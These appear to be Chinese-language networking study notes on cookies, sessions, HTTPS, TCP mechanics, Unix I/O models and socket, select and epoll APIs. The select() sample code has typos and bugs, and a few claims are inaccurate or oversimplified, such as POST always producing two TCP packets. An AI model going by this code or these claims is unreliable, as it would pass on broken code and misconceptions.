###### cookie

HTTP协议是无状态的，主要是为了让HTTP协议尽可能简单，使得它能够处理大量事务。HTTP/1.1引入Cookie来保存状态信息。

cookie是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器之后向同一服务器再次发送请求时被携带上，用户告知服务器两个请求时来自同一浏览器。

随着现代浏览器发展，其开始支持各种各样的存储方式，cookie渐渐被淘汰。新的浏览器API已经允许开发者直接将数据存储在本地，如使用web storage API 

Cookie有大小限制并且浏览器对每个站点也有Cookie的个数限制，

**用途**

* 会话状态管理（如用户登录状态、购物车等需要记录的信息）
* 个性化设置（如用户自定义设置、主题）
* 浏览器行为跟踪（如跟踪分析用户行为）

**创建过程**

服务器发送的响应报文包含set-cookie首部字段，客户端得到响应报文后把cookie中内存保存到浏览器中

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[page content]
```

客户端之后对同一服务器发送请求时，会从浏览器中取出cookie信息通过cookie请求首部字段发给服务器

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

###### session

由于HTTP的无状态导致，服务器不知道请求方是谁，session可以用于维护用户登录状态

除了可以将用户信息通过cookie存储在用户浏览器中，也可以使用session存储在服务器，存储在服务器更安全

session可以存储在服务器的文件、数据库或者内存中。

session的实现常常依赖于Cookie机制，通过Cookie机制回传SessionID；

**过程**

1. 浏览器第一次请求网站资源，服务器生成session ID
2. 把生成的session ID保存在服务器端存储
3. 把生成的session ID通过set-cookie返回给浏览器
4. 浏览器接收到session ID，在下一次发送请求时会带上这个session ID
5. 此后的请求都会交换这个session ID，进行有状态的会话

**session ID劫持**

假如session ID是基于HTTP传输的，因为是明文传输，可能被中间的路由器劫持，攻击者得到session ID后，把它带到自己的请求中，就能够进入你的账户

处理方法：动态时间间隔内刷新session ID，加上Token

###### cookie和session应用

* cookie只能存储ASCII码字符串，而session则可以存储任何类型的数据
* cookie只能存储在浏览器中，容易被恶意查看。如果非要将一些隐私数据存放在cookie中，可以将值进行加密，在服务器端解密
* 对于大型网站，如果用户所有信息都存储在session中，那么开销非常大，因此不建议将所有的信息都存储到session中

#### HTTPS

HTTP有一下安全问题

* 使用明文传输，内容可能被窃听
* 不验证对方身份，通信方的身份可能遭遇伪装
* 无法证明报文的完整性，报文有可能遭到篡改

HTTPS不是新的协议，而是让HTTP先和SSL（secure sockets Layer）通信，再由SSL和TCP通信，也就是说HTTPS使用了隧道进行通信

**优点**：

* 传输数据过程使用秘钥进行加密，安全性高
* 可以认证用户和服务器，确保数据发送到正确的用户和服务器

**缺点：**

* 时延高
* 部署成本高
* 需要加密解密计算，占用资源多

##### HTTPS工作流程

https://github.com/ljianshu/Blog/issues/50

准备工作：首先客户端浏览器安装一些权威第三方机构的公钥 ，服务器端向三方机构申请自己的数字证书

![img](http://xyongs.cn/image/HTTPS-work-6-5.png)

1. Client发起一个HTTPS请求，根据RFC2818的规定，Client需要连接到Server的443（默认）端口
2. Server把事先配置好的公钥证书返回给客户端
3. Client验证公钥证书：比如是否在有效期内
4. Client使用伪随机数生成器加密所使用的对称秘钥（会话秘钥），然后用证书的公钥加密这个对称秘钥，发给server
5. server使用自己的私钥解密这个消息，得到对称秘钥。至此，Client和server都持有了对方的秘钥
6. Server使用对称秘钥加密“A”，发送给Client
7. Client使用对称秘钥解密，得到A
8. Client再次发起HTTP请求，使用对称秘钥加密信息B，Server解密

client使用的是对称加密（加密解密使同一秘钥），server使用的是非对称加密（接收Client的会话秘钥）

##### 第三方认证

https://juejin.im/post/5b0274ac6fb9a07aaa118f49

![img](http://xyongs.cn/image/HTTPS-1-6-5.png)

**数字证书 = 网站信息 + 数字签名**

> 客户端使用该三方机构的公钥对证书中的数字签名进行解密，然后依据证书中的 网站信息进行签名生成，如果对比发现不匹配，请求失败

##### HTTP与HTTPS区别

1. HTTP是明文传输，HTTPS传输的数据经过TLS加密后的
2. HTTPS在TCP三次握手后，还需要进行SSL的handshake，协商加密使用的是对称加密秘钥
3. HTTPS协议需要服务器端申请证书，浏览器端安装对应的根证书
4. HTTP协议端口是80,HTTPS是443

![img](http://xyongs.cn/image/HTTPS-SSL-6-5.png)

##### HTTP1.X与HTTP2.0

[HTTP1.1 和 HTTP2.0 的区别](https://juejin.im/post/5d3ac5dfe51d454f6f16ecde)

* **新的二进制格式（Binary Format）**，HTTP1.x的解析是基于文本，

* **多路复用（MultiPlexing）**即连接共享，即每一个request都是用作连接共享机制的。一个request对应一个id，这样一个连接上可以有多个request，每个连接的request可以随机的混杂在一起，接收方可以根据request的ID将request在归属到各自不同的服务端请求中。

* **header压缩**，HTTP1.x的header带有大量信息，而且每次都要重复发送，HTTP2.0使用encoder来减少需要传输的header大小，通信双方各自cache一份header fields表，既避免了重复header的传输，又减小需要传输的大小。

* 服务端推送：同SPDY一样，HTTP2.0也具有server push功能

* HTTP2.0多个请求可同时在一个连接上并行执行。某个请求任务耗时严重，不会影响其他链接的正常执行；

  ![img](http://xyongs.cn/image/HTTP2_0-6-22.png)

#### 常见问题

**GET和POST区别**
说道GET和POST，就不得不提HTTP协议，因为浏览器和服务器的交互是通过HTTP协议执行的，而GET和POST也是HTTP协议中的两种方法。

HTTP全称为Hyper Text Transfer Protocol，中文翻译为超文本传输协议，目的是保证浏览器与服务器之间的通信。HTTP的工作方式是客户端与服务器之间的请求-应答协议。

HTTP协议中定义了浏览器和服务器进行交互的不同方法，基本方法有4种，分别是GET，POST，PUT，DELETE。这四种方法可以理解为，对服务器资源的查，改，增，删。

1. GET：从服务器上获取数据，也就是所谓的查，仅仅是获取服务器资源，不进行修改。
2. POST：向服务器提交数据，这就涉及到了数据的更新，也就是更改服务器的数据。
3. PUT：英文含义是放置，也就是向服务器新添加数据，就是所谓的增。
4. DELETE：从字面意思也能看出，这种方式就是删除服务器数据的过程。

**区别：**

* Get是不安全的，因为在传输过程，数据被放在请求的URL中；Post的所有操作对用户来说都是不可见的。 但是这种做法也不时绝对的，大部分人的做法也是按照上面的说法来的，但是也可以在get请求加上 request body，给 post请求带上 URL 参数。
* Get请求提交的url中的数据最多只能是2048字节，这个限制是浏览器或者服务器给添加的，http协议并没有对url长度进行限制，目的是为了保证服务器和浏览器能够正常运行，防止有人恶意发送请求。Post请求则没有大小限制。
* Get限制Form表单的数据集的值必须为ASCII字符；而Post支持整个ISO10646字符集。
* Get执行效率却比Post方法好。Get是form提交的默认方法。
* GET产生一个TCP数据包；POST产生两个TCP数据包。
* 对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；
* 而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。

### 🏷 运输层

运输层的主要任务就是向两台主机进程之间的通信提供通用的数据传输服务。应用进程利用该服务传送应用层报文。

运输层主要使用TCP，UDP协议

|              | UDP                                  | TCP                              |
| ------------ | ------------------------------------ | -------------------------------- |
| 是否连接     | 无连接                               | 面向连接                         |
| 是否可靠     | 不可靠传输，不使用流量控制和拥塞控制 | 可靠传输，使用流量控制和拥塞控制 |
| 连接对象个数 | 支持一对一，一对多，多对一和多对多   | 一对一                           |
| 传输方式     | 面向报文                             | 面向字节流                       |
| 首部开销     | 小，仅8字节                          | 最小20字节，最大60字节           |
| 场景         | 实时应用（IP电话，视频会议，直播）   | 用于可靠传输，如文件传输         |

**运行在TCP协议上的协议：**

HTTP（Hypertext Transfer Protocol，超文本传输协议），主要用于普通浏览。
HTTPS（HTTP over SSL，安全超文本传输协议）,HTTP协议的安全版本。
FTP（File Transfer Protocol，文件传输协议），用于文件传输。
POP3（Post Office Protocol, version 3，邮局协议），收邮件用。
SMTP（Simple Mail Transfer Protocol，简单邮件传输协议），用来发送电子邮件。
TELNET（Teletype over the Network，网络电传），通过一个终端（terminal）登陆到网络。
SSH（Secure Shell，用于替代安全性差的TELNET），用于加密安全登陆用。

**运行在UDP协议上的协议：**

**BOOTP（Boot Protocol，启动协议），应用于无盘设备。
NTP（Network Time Protocol，网络时间协议），用于网络同步。
DHCP（Dynamic Host Configuration Protocol，动态主机配置协议），动态配置IP地址。
**运行在TCP和UDP协议上：

DNS（Domain Name Service，域名服务），用于完成地址查找，邮件转发等工作。

#### TCP协议

**TCP提供一种面向连接的、可靠的字节流服务**

![img](http://xyongs.cn/image/TCP-6-4.png)

源端口和目的端口分别包含了16bit，此处限定了计算机的端口数量2^16

https://www.cnblogs.com/Allen-rg/p/7190042.html

紧急标志+紧急数据指针：紧急标志通知对端，我放了一个紧急数据在数据流中

紧急数据指针指向了紧急数据最后一个字节的下一个字节。

##### TCP 建立连接----三次握手

1、客户端发送一个SYN段指明打算连接的服务器端口，以及初始序号（ISN）

2、服务器发回包含服务器的初始序号的SYN报文段作为应答，同时将确认序号设置为客户的ISN加一以对客户的SYN报文进行确认；

3、客户确认序号设置为服务器的ISN加一，对服务器的SYN报文确认

![img](http://xyongs.cn/image/TCP.png)

##### 为什么TCP客户端最后还要发送一次确认呢

一句话，主要防止已经失效的连接请求报文突然又传送到了服务器，从而产生错误。

如果使用的是两次握手建立连接，假设有这样一种场景，客户端发送了第一个请求连接并且没有丢失，只是因为在网络结点中滞留的时间太长了，由于TCP的客户端迟迟没有收到确认报文，以为服务器没有收到，此时重新向服务器发送这条报文，此后客户端和服务器经过两次握手完成连接，传输数据，然后关闭连接。此时此前滞留的那一次请求连接，网络通畅了到达了服务器，这个报文本该是失效的，但是，两次握手的机制将会让客户端和服务器再次建立连接，这将导致不必要的错误和资源的浪费。

如果采用的是三次握手，就算是那一次失效的报文传送过来了，服务端接受到了那条失效报文并且回复了确认报文，但是客户端不会再次发出确认。由于服务器收不到确认，就知道客户端并没有请求连接。

##### TCP断开连接--四次挥手

客户端发送一个FIN报文（报文4）给服务器，表示我将关闭客户端到服务器端这个方向的连接。

服务器收到报文4后，发送一个ACK报文（报文5）给客户端，序号为报文4的序号加1。

服务器发送一个FIN报文（报文6）给客户端，表示自己也将关闭服务器端到客户端这个方向的连接。

客户端收到报文6后，发回一个ACK报文（报文7）给服务器，序号为报文6的序号加1。

**理由**

**这是由于TCP的半关闭造成的。既然一个TCP连接是双全工的，因此每个方向必须单独地进行关闭。**

![img](http://xyongs.cn/image/image1.png)

##### 为什么客户端最后还要等待2MSL？

MSL（Maximum Segment Lifetime），TCP允许不同的实现可以设置不同的MSL值。

第一，保证客户端发送的最后一个ACK报文能够到达服务器，因为这个ACK报文可能丢失，站在服务器的角度看来，我已经发送了FIN+ACK报文请求断开了，客户端还没有给我回应，应该是我发送的请求断开报文它没有收到，于是服务器又会重新发送一次，而客户端就能在这个2MSL时间段内收到这个重传的报文，接着给出回应报文，并且会重启2MSL计时器。

第二，防止类似与“三次握手”中提到了的“已经失效的连接请求报文段”出现在本连接中。客户端发送完最后一个确认报文后，在这个2MSL时间中，就可以使本连接持续的时间内所产生的所有报文段都从网络中消失。这样新的连接中不会出现旧连接的请求报文。

##### 为什么建立连接是三次握手，关闭连接确是四次挥手呢

建立连接的时候， 服务器在LISTEN状态下，收到建立连接请求的SYN报文后，把ACK和SYN放在一个报文里发送给客户端。 

而关闭连接时，服务器收到对方的FIN报文时，仅仅表示对方不再发送数据了但是还能接收数据，而自己也未必全部数据都发送给对方了，所以己方可以立即关闭，也可以发送一些数据给对方后，再发送FIN报文给对方来表示同意现在关闭连接，因此，己方ACK和FIN一般都会分开发送，从而导致多了一次。

**TCP状态转移图**

![img](http://xyongs.cn/image/TCP-6-3.png)

**如果已经建立了连接，但是客户端突然出现故障了怎么办？**

TCP还设有一个保活计时器，显然，客户端如果出现故障，服务器不能一直等下去，白白浪费资源。服务器每收到一次客户端的请求后都会重新复位这个计时器，时间通常是设置为2小时，若两小时还没有收到客户端的任何数据，服务器就会发送一个探测报文段，以后每隔75分钟发送一次。若一连发送10个探测报文仍然没反应，服务器就认为客户端出了故障，接着就关闭连接。

##### TCP第三次握手失败后怎么办？

**三次握手**

客户端 ==> SYN是1同步 ,ACK确认标志是0,seq序号是x ==> 服务器
客户端 <== SYN是1同步 ,ACK确认标志是1,seq序号是y,ack确认号是x+1 <==服务器
客户端 ==> ACK确认标志是1,seq序号是x+1,ack确认号是y+1 ==>服务器

服务器端发送了一个SYN+ACK报文后就会启动一个定时器，等待client返回的ACK。如果第三次握手失败的话client给server返回了ACK，server并不能收到这个ACK报文。那么server端就会启动超时重传机制，超过规定时间后重新发送SYN+ACK，重传次数根据/proc/sys/net/ipv4/tcp_synack_retries来指定，默认是5次。如果重传指定次数了后，任然未收到ACK应答，那么一段时间后server自动关闭这个链接。但是client认为这个连接已经建立，如果client端向server写数据，server端将以RST包响应。

##### TCP 可靠性保证

1. 序列号、确认应答、超时重传
2. 窗口控制与快重传
3. 拥塞控制
4. 差错控制

#### 重传——TCP的重要事件

https://zhuanlan.zhihu.com/p/101702312

##### 数据分片

数据从主机传送到另一个主机往往要经过路由器，网关等设备。这些设备都要对经过的数据进行处理。由于这些设备处理数据的能力有有一定限制，不能处理超出额定字节的数据，所以发送的时候需要确定发送数据包的最大字节数。

##### 滑动窗口机制

在进行数据传输时，如果传输的数据比较大，需要拆分为多个数据包进行发送。TCP协议需要对数据包进行确认才能发送下一个数据包。

这样一来会在等待确认应答包环节浪费时间。为了避免这种情况，引入窗口概念。

窗口大小：指不需要等待确认应答包而可以继续发送数据包的最大值

![img](http://xyongs.cn/image/image2.png)



当发送端接收到确认应答包后向后滑动

![img](http://xyongs.cn/image/image3.png)



**发送数据包丢失**

![img](http://xyongs.cn/image/image4.png)

下面分为 7 部分对上图进行讲解。

1) 发送端发送数据包：这里窗口大小为 4，发送端发送 4 个数据包，分别为 1-1000、1001-2000、2001-3000 和 3001-4000。

2) 接收端返回确认应答包：接收端接收到这些数据，并给出确认应答包。接收端收到了数据包 1-1000，返回了确认应答包；收到了数据包 1001-2000，返回了确认应答包；但是数据包 2001-3000，在发送过程中丢失了，没有成功到达接收端。数据包 3001-4000 没有丢失，成功到达了接收端，但是该数据包不是接收端应该接收的数据包，数据包 2001-3000 才是真正应该接收的数据包。因此收到数据包 3001-4000 以后，接收端第一次返回下一个应该发送 2001 的数据包的确认应答包。

3) 发送端发送数据包：发送端仍然继续向接收端发送 4 个数据包，分别为 4001-5000、5001-6000、6001-7000 和 7001-8000。

4) 接收端返回确认应答包：接收端接收到这些数据，并给出确认应答包。当接收端收到数据包 4001-5000 时，发现不是自己应该接收的数据包 2001-3000，第二次返回下一个应该发送 2001 的数据包的确认应答包。当接收端收到数据包 5001-6000 时，仍然发现不是自己应该接收的数据包 2001-3000，第三次返回下一个应该发送 2001 的数据包的确认应答包。以此类推直到接收完所有数据包，接收端都返回下一个应该发送 2001 的数据包的确认应答包。

5) 发送端重发数据包：发送端连续 3 次收到接收端发来的下一个应该发送 2001 的数据包的确认应答包，认为数据包 2001-3000 丢失了，就进行重发该数据包。

6) 接收端收到重发数据包：接收端收到重发数据包以后，查看这次是自己应该接收的数据包 2001-3000，并返回确认应答包，告诉发送端，下一个该接收 8001 的数据包了。

7) 发送端发送数据包：发送端收到确认应答包后，继续发送窗口大小为 4 的数据包，分别为 8001-9000、9001-10000、10001-11000 和 11001-12000。

##### TCP 流量控制

在使用滑动窗口机制进行数据传输时，发送方根据实际情况发送数据包，接收端接收数据包。但是，接收端处理数据包的能力是不同的。

1) 如果窗口过小，发送端发送少量的数据包，接收端很快就处理了，并且还能处理更多的数据包。这样，当传输比较大的数据时需要不停地等待发送方，造成很大的延迟。

2) 如果窗口过大，发送端发送大量的数据包，而接收端处理不了这么多的数据包，这样，就会堵塞链路。如果丢弃这些本应该接收的数据包，又会触发重发机制。

3) 为了避免这种现象的发生，TCP 提供了流控制。所谓的流控制就是使用不同的窗口大小发送数据包。发送端第一次以窗口大小（该窗口大小是根据链路带宽的大小来决定的）发送数据包，接收端接收这些数据包，并返回确认应答包，告诉发送端自己下次希望收到的数据包是多少（新的窗口大小），发送端收到确认应答包以后，将以该窗口大小进行发送数据包。

TCP 流控制过程如图所示。

![img](http://xyongs.cn/image/image5.png)

##### 拥塞控制

流量控制是由于接收方不能及时处理数据而引发的控制机制，拥塞是由于网络中的路由器超载而引起的严重延迟现象。拥塞的发生会造成数据的丢失，数据的丢失会引起超时重传，而超时重传会进一步加剧拥塞。

（大家都在用网，你在这里狂发，吞吐量就这么大，当然会堵）

在TCP的拥塞控制中，任然是利用**发送方的窗口**来控制注入网络中的数据流的速度。减缓注入网络的数据流

> 发送窗口大小 = min（接收方通告窗口大小，拥塞窗口大小）

<font color="red">**控制拥塞窗口且保持连接的可靠性，TCP采取的措施：**</font>

1. 慢启动：定义拥塞窗口，一开始将该窗口大小设置为1，之后每一次接收到确认应答，将拥塞窗口*2
2. 拥塞避免：设置慢启动阈值，一般一开始设置为2^16,。拥塞避免是指当拥塞窗口大小达到这个阈值时，拥塞窗口的值不再指数上升，而是加法增加（每次确认应答/每个rtt，拥塞窗口大小+1），以此来避免拥塞

>  将报文段超时重传看做拥塞，则一旦发生超时重传，我们需要先将阈值设置为当前窗口大小的一般，并且将窗口大小设置为初始值1，然后进入慢启动过程；

3. 快重传：接收方在收到一个失序报文时，立即发出重复确认，发送方在遇到3次重复确认应答时，代表收到了三个报文段，但是之前的一个段丢失了，便是对他立即进行重传；
4. 快恢复：收到3个重复确认应答后，先将阈值设置为当前窗口大小的一半，将拥塞窗口大小设置为慢启动阈值+3的大小。

这样可以达到：在TCP通信时，网络吞吐量呈逐渐上升，并且随着拥堵来降低吞吐量，在进入慢慢上升过程，网络不会轻易发送瘫痪。

##### 滑动窗口最大能设置成多大?

[链接：](https://www.jianshu.com/p/15788a9e9006)

由于TCP报文头现在2^16，可以通过窗口缩放因子增加

**窗口缩放因子**

窗口缩放在RFC 1072中引入并在RFC 1323中进行了改进。实际上，窗口缩放只是将16位窗口字段扩展为32位长度。解决方案是定义TCP选项以指定计数，通过该计数，TCP标头字段应按位移位以产生更大的值。

##### TCP黏包问题

TCP是一个基于字节流的传输服务，“流”意味着TCP所传输的数据是没有边界的。所以可能会出现两个数据包黏在一起的情况

**解决**

* 发送定长的包。如果每个消息大小一样，那么在接收对等方只要累计接收数据，直到数据长度等于一个定长的数值就将它作为一个消息
* 包头加上包体的长度
* 数据包之间设立边界，如添加特殊字符`\r\n`
* 使用更复杂的应用层协议

##### 能解释一下沾包和拆包吗，以及为什么？

https://www.cnblogs.com/wade-luffy/p/6165671.html

TCP是一个基于字节流的传输服务，“流”意味着TCP所传输的数据是没有边界的。所以可能会出现两个数据包黏在一起的情况

假设客户端分别发送了两个数据包D1和D2给服务器端，由于服务器一次读取的字节数是不确定的，故可能存在以下情况：

1. 服务端分两次读取到两个独立的包，分别是D1和D2，没有粘包和拆包
2. 服务端一次接收到了两个数据包，D1和D2粘合在一起，被称为TCP粘包
3. 服务端分两次读取到了两个数据包，D1包的全部和D2包的部分，D2包的剩余部分，这称为TCP拆包。
4. 服务端分两次读取到了两个数据包，第一次读取到了D1包的部分内容D1_1，第二次读取到了D1包的剩余内容D1_2和D2包的整包。

如果此时服务端TCP接收滑窗非常小，而数据包D1和D2比较大，很有可能会发生第五种可能，即服务端分多次才能将D1和D2包接收完全，期间发生多次拆包。

##### TCP粘包/拆包发生的原因

问题产生的原因有三个，分别如下。

（1）应用程序write写入的字节大小大于套接口发送缓冲区大小；

（2）进行MSS大小的TCP分段；

（3）以太网帧的payload大于MTU进行IP分片。

##### 粘包问题的解决策略

 由于底层的TCP无法理解上层的业务数据，所以在底层是无法保证数据包不被拆分和重组的，这个问题只能通过上层的应用协议栈设计来解决，根据业界的主流协议的解决方案，可以归纳如下。

（1）消息定长，例如每个报文的大小为固定长度200字节，如果不够，空位补空格；

（2）在包尾增加回车换行符进行分割，例如FTP协议；

（3）将消息分为消息头和消息体，消息头中包含表示消息总长度（或者消息体长度）的字段，通常设计思路为消息头的第一个字段使用int32来表示消息的总长度；

（4）更复杂的应用层协议。

#### TCP分段与IP分片

[TCP分段与IP分片](https://blog.csdn.net/yao5hed/article/details/81288072)

[网络协议】TCP分段与IP分片](https://blog.csdn.net/ns_code/article/details/30109789)

TCP报文段如果很长的话，会在发送时发生分段，在接收时进行重组，同样IP数据报在超过一定值时也会发生分片，在接收端再将分片重组。

##### MTU（最大传输单元）

链路层中的网络对数据帧的一个限制，以以太网为例，MTU为1500个字节。一个IP数据报在以太网中传输，如果它的长度大于MTU，就要进行分片传输，使得每片的长度小于MTU。<font color="red">分片传输的IP数据不一定按序到达，但IP首部中的信息能让这些数据报片按序组装，IP数据报的分片与重组是在网络层完成的。</font>

##### MSS（最大分段大小）

MSS是TCP报文头部的字段，MSS是TCP数据包每次能够传输的最大数据分段，TCP报文段的长度大于MSS时，进行分段传输。TCP在建立连接的时候通常需要双方协商这个MSS值，每一方有用于通告它期望接收到的MSS选项。*MSS的值一般为MTU减去两个首部大小（需减去IP数据包包头的大小20Bytes和TCP数据段的包头20Bytes）*--以太网中一般为1500-20-20=1460。

<font color="blue">UDP不会分段，就由IP分片，TCP会分段，就不用IP来分片</font>

<font color="blue">IP数据报分片后，只有第一片带有UDP首部或ICMP首部，其余部分只有IP头部，到了端点后根据IP头部中的消息在网络层进行重组。</font>

而TCP报文段的每个分段中都有TCP首部，到了端点之后根据TCP首部的信息在传输层进行重组

### 🏷 网络编程

#### I/O模型

https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Socket.md

一个输入操作通常包含两个阶段

* 等待数据准备好
* 从内核向进程复制数据

对于一个套接字上的输入操作，第一步通常涉及等待数据从网络中到达。当所等待的数据到达时，它被复制到内核的某个缓冲区。第二部就是把数据从内核缓冲区复制到应用的进程缓冲区。

Unix有5中I/O模型

* 阻塞式I/O
* 非阻塞式I/O
* I/O复用 (select 和poll)
* 信号驱动式I/O （SIGIO）
* 异步I/O （AIO）

##### 阻塞式IO

应用进程被阻塞，直到数据从内核缓冲区复制到应用进程缓冲区才返回。

应该注意到，在阻塞的过程中，其他的应用进程还可以执行，因此阻塞不意味着整个操作系统都被阻塞。因为其他进程还可以被执行，所以不消化CPU时间，这种模型的CPU利用率比较高。

![img](http://xyongs.cn/image/IO-1-6-7.png)

##### 非阻塞IO

应用进程在执行系统调用之后，内核返回一个错误码。应用进程可以继续执行，但是需要不间断的执行系统调用来获知IO是否完成，这种方式称之为**轮询**。

由于CPU要处理更多的系统调用，因此这种模型的CPU利用率较低。

![img](http://xyongs.cn/image/IO-2-6-7.png)

##### I/O复用

也称事件驱动IO，在单个线程里同时监控多个套接字，通过select或poll轮询负责所有socket，当某个socket有数据到达了，就通知用户进程

![img](http://xyongs.cn/image/IO-3-6-7.png)

可以看出，进程阻塞在select调用上，等待有套接字变为可读；当有套接字有可读以后，调用recvfrom把数据报从内核中复制到用户进程缓冲区，此时进程阻塞在IO执行的第二个阶段。

**IO复用的特点是进行了两个系统调用，进程显示阻塞在select/poll上，再是阻塞在读操作的第二阶段上。**

##### 信号驱动式I/O

![img](http://xyongs.cn/image/IO-4-6-7.png)

信号驱动就是让内核在描述符就绪时发送SIGIO型号通知用户进程。

1. 开启socket的信号驱动IO功能，
2. 通过`sigaction`系统调用注册SIGIO型号处理函数--该系统调用会立即返回
3. 当数据准备好事，内核会为该进程产生一个SIGIO信号
4. 应用程序调用recvfrom

所以，**信号驱动式IO的特点就是在等待数据ready期间进程不被阻塞，当收到信号通知时再阻塞并拷贝数据。**

##### 异步I/O

![img](http://xyongs.cn/image/IO-5-6-7.png)

1. 用户发起`aio_read`操作后，该系统调用立即返回
2. 内核会自己等待数据ready，并自动拷贝到用户内存。整过程完成之后，内核向用户进程发送一个信号，通知IO操作完成

所以，**异步IO的特点是IO执行的两个阶段都由内核去完成，用户进程无需干预，也不会被阻塞。**

##### Socket

![img](http://xyongs.cn/image/socket-6-5.jpg)

**创建**

```c++
<sys/socket.h>
int socket(int af, int type, int protocol);
// af:地址族   AF_INET(IPv4)   AF_INET6(IPv6)
// type:      SOCK_STREAM(流格式套接字)， SOCK_DGRAM（数据报套接字）
// protocol:   IPPROTO_TCP   
```

**bind()函数**

服务器将特定的套接字与特定的IP地址端口绑定起来

```c++
int bind(int sock, struct sockadd *addr, socklen_t addrlen);
```

**connect()函数**

客户端将套接字与端口绑定

```c
int connect(int sock, struct sockaddr *serv_add, socklen_t addrlen);
```

**listen()函数**

服务器让套接字进入监听状态

```c
int listen(int sock, int backlog);  //Linux
```

sock 为需要进入监听状态的套接字，backlog 为请求队列的最大长度。

**请求队列**

当套接字正在处理客户端请求时，如果有新的请求进来，套接字是没法处理的，只能把它放进缓冲区，待当前请求处理完毕后，再从缓冲区中读取出来处理。如果不断有新的请求进来，它们就按照先后顺序在缓冲区中排队，直到缓冲区满。这个缓冲区，就称为请求队列（Request Queue）。

**accept() 函数**

当套接字处于监听状态时，可以通过 accept() 函数来接收客户端请求。它的原型为：

```c
int accept(int sock, struct sockaddr *addr, socklen_t *addrlen);  //Linux
```

它的参数与 listen() 和 connect() 是相同的：sock 为服务器端套接字，addr 为 sockaddr_in 结构体变量，addrlen 为参数 addr 的长度，可由 sizeof() 求得。

**write()函数**

Linux 不区分套接字文件和普通文件，使用 write() 可以向套接字中写入数据，使用 read() 可以从套接字中读取数据。

```c
ssize_t write(int fd, const void *buf, size_t nbytes);
```

fd 为要写入的文件的描述符，buf 为要写入的数据的缓冲区地址，nbytes 为要写入的数据的字节数。

**read() 函数**

```c
ssize_t read(int fd, void *buf, size_t nbytes);
```

fd 为要读取的文件的描述符，buf 为要接收数据的缓冲区地址，nbytes 为要读取的数据的字节数。

[**socket**](http://c.biancheng.net/socket/)**缓冲区**

每个 socket 被创建后，都会分配两个缓冲区，输入缓冲区和输出缓冲区。

> write()/send() 并不立即向网络中传输数据，而是先将数据写入缓冲区中，再由TCP协议将数据从缓冲区发送到目标机器。一旦将数据写入到缓冲区，函数就可以成功返回，不管它们有没有到达目标机器，也不管它们何时被发送到网络，这些都是TCP协议负责的事情。

#### IO复用

##### select

```c++
int select(int maxfd, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval* timeout);
//功能：轮询扫描多个描述符是否发送响应
/*
maxfd     指定要检测的范围		所检测描述符最大值+1
readfd		可读描述符集		检测该集合中是否有数据可读
writefd  	可写描述符
exceptdfs	异常描述符
timeout		超时时间		超过规定后唤醒
返回值 int
0  超时
-1 出错
>0 准备好描述符的数量
*/
```

select()函数能对多个文件描述符进行监测，等待一个或多个描述符成为就绪状态，从而完成IO操作

```c++
sockfd = socket(AF_INET, SOCK_STREAM, 0);
memset(&addr, 0, sizeof(addr));
addr.sin_family = AF_INET;
addr.sin_port = htons(5000);
addr.sin_addr.s_addr = INADDR_ANY;
bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));
listen(sockfd, 5);  //为请求队列的最大长度5。

for (int i = 0; i < 5; i++)
{
    memset(&client, 0, sizeof(client));
    addrlen = sizeof(client);
    dfs[i] = accept(sockfd, (struct sockaddr*)&client, &addrlen);
    if (fds[1] > max)
        max = fds[i];
}
while(1)
{
    FD_ZERO(&rset);
    for(int i = 0; i < 5; i++)
    {
        FD_SET(fds[i], &rset);
    }
    select(max+1, &rset, NULL, NULL, NULL);
    for (int i = 0; i < 5; i++)
    {
        if (FD_ISSFT(fds[i], &rset))
        {
            memset(buffer, 0, MAXBUF);
            read(fds[i], buffer, MAXBUF);
            puts(buffer);
        }
    }
}
```

**select缺点**: 

* 文件集不可重用，每次循环后需要重新赋值
* 存在用户态与内核态的频繁切换
* 不知道哪个文件描述符激活，需要不断遍历

![img](http://xyongs.cn/image/select-6-8.png)

##### poll

```c++
int poll(struct pollfd *fds, unsigned int nfds, int timeout);
```

poll功能与select类似，也是等待一组描述符成为就绪状态。

poll中的描述符是pollfd类型的数组

```c++
struct pollfd{
    int fd;
    short events;
    short revents;
}
```

![img](http://xyongs.cn/image/poll-6-8.png)

**select与poll比较**

1. 功能

select和poll的功能基本相同，不过存在一些细节上有所不同。

* select会修改描述符，而poll不会；
* select默认监听少于1024个描述符
* poll提供了更多的事件类型，并且对描述符的重复利用上比elect高

2. 速度：两者速度都比较慢，每次调用都需要将全部的描述符从应用进程缓冲区复制到内核缓冲区。

##### epoll

```c++
int epoll_create(int size);
int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);
int epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout);
```

`epoll_ctl()`用于向内核注册新的描述符或者改变某个文件描述符的状态。已注册的描述符在内核中被维护在一颗红黑树上，通过回调函数内核将IO准备好的文件描述符加入到一个链表中管理，进程调用`epoll_wait()`便可以得到事件完成的描述符。

从上面的描述可以看出，epoll只需将描述符从进程缓冲区向内核缓冲区拷贝一次，并且进程不需要通过轮询来获取事件完成的描述符

epoll仅适用于Linux OS。

**LT模式**		

当`epoll_wait()`检测到描述符事件到达时，将此事件通知进程，进程可以不立即处理，下次调用epoll_wait()会再次通知进程。

**ET模式**

和LT模式不同，通知之后进程必须立即处理事件

[epoll LT 模式和 ET 模式详解](https://cloud.tencent.com/developer/article/1636224)

### 🏷 网络层

网络层的任务就是选择合适的网间路由和交换结点，确保计算机通信的数据及时传送。在发送数据时，网络层把运输层产生的报文段或用户数据报封装成分组和包进行传送。在 TCP/IP 体系结构中，由于网络层使用 IP 协议，因此分组也叫 IP 数据报 ，简称数据报。

互联网是由大量的异构（heterogeneous）网络通过路由器（router）相互连接起来的。互联网使用的网络层协议是无连接的网际协议（Intert Prococol）和许多路由选择协议，因此互联网的网络层也叫做网际层或 IP 层。

协议： IP，ICMP，IGMP

IP：即网际协议，是用于报文交换网络的一种面向数据的协议。

IP地址是IP协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。

